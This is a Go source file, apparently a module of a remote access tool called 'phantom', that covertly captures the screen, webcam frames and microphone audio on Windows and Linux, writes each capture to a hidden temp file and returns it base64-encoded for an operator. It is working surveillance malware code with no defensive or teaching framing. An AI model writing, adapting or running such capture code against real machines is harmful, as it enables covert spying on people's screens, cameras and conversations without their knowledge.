package main

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
)

func screenshot() Result {
	tmp := filepath.Join(os.TempDir(), ".phantom_shot.png")

	if runtime.GOOS == "windows" {
		ps := `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; ` +
			`$b=[Windows.Forms.SystemInformation]::VirtualScreen; ` +
			`$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height; ` +
			`$g=[Drawing.Graphics]::FromImage($bmp); ` +
			`$g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); ` +
			`$bmp.Save('` + tmp + `',[Drawing.Imaging.ImageFormat]::Png)`
		newCmd("powershell", "-NoProfile", "-Command", ps).Run()
		if b, err := os.ReadFile(tmp); err == nil && len(b) > 0 {
			return Result{OK: true, Out: base64.StdEncoding.EncodeToString(b)}
		}
		return Result{OK: false, Err: "powershell screenshot failed"}
	}

	attempts := [][]string{
		{"import", "-window", "root", tmp},
		{"scrot", "-o", tmp},
		{"sh", "-c", "xwd -root -silent | convert xwd:- " + tmp},
	}
	for _, a := range attempts {
		if newCmd(a[0], a[1:]...).Run() == nil {
			if b, err := os.ReadFile(tmp); err == nil && len(b) > 0 {
				return Result{OK: true, Out: base64.StdEncoding.EncodeToString(b)}
			}
		}
	}
	return Result{OK: false, Err: "no screenshot tool (need imagemagick/scrot + DISPLAY)"}
}

func webcam() Result {
	tmp := filepath.Join(os.TempDir(), ".phantom_cam.jpg")

	if runtime.GOOS == "windows" {
		// ffmpeg dshow; device name varies, try common ones
		for _, dev := range []string{"0", "Integrated Camera", "USB Video Device"} {
			args := []string{"-y", "-f", "dshow", "-i", "video=" + dev,
				"-frames:v", "1", tmp}
			if newCmd("ffmpeg", args...).Run() == nil {
				if b, err := os.ReadFile(tmp); err == nil && len(b) > 0 {
					return Result{OK: true, Out: base64.StdEncoding.EncodeToString(b)}
				}
			}
		}
		return Result{OK: false, Err: "webcam needs ffmpeg (winget install ffmpeg)"}
	}

	attempts := [][]string{
		{"ffmpeg", "-y", "-f", "video4linux2", "-i", "/dev/video0", "-frames:v", "1", tmp},
		{"fswebcam", "-q", "--no-banner", tmp},
	}
	for _, a := range attempts {
		if newCmd(a[0], a[1:]...).Run() == nil {
			if b, err := os.ReadFile(tmp); err == nil && len(b) > 0 {
				return Result{OK: true, Out: base64.StdEncoding.EncodeToString(b)}
			}
		}
	}
	return Result{OK: false, Err: "no webcam tool (need ffmpeg/fswebcam)"}
}

func mic(secs int) Result {
	tmp := filepath.Join(os.TempDir(), ".phantom_mic.wav")

	if runtime.GOOS == "windows" {
		args := []string{"-y", "-f", "dshow", "-i", "audio=Microphone",
			"-t", strconv.Itoa(secs), tmp}
		if newCmd("ffmpeg", args...).Run() == nil {
			if b, err := os.ReadFile(tmp); err == nil && len(b) > 0 {
				return Result{OK: true, Out: base64.StdEncoding.EncodeToString(b)}
			}
		}
		return Result{OK: false, Err: "mic needs ffmpeg (winget install ffmpeg)"}
	}

	attempts := [][]string{
		{"ffmpeg", "-y", "-f", "alsa", "-i", "default", "-t", strconv.Itoa(secs), tmp},
		{"arecord", "-q", "-d", strconv.Itoa(secs), "-f", "S16_LE", "-r", "44100", tmp},
	}
	for _, a := range attempts {
		if newCmd(a[0], a[1:]...).Run() == nil {
			if b, err := os.ReadFile(tmp); err == nil && len(b) > 0 {
				return Result{OK: true, Out: base64.StdEncoding.EncodeToString(b)}
			}
		}
	}
	return Result{OK: false, Err: "no mic tool (need ffmpeg/arecord)"}
}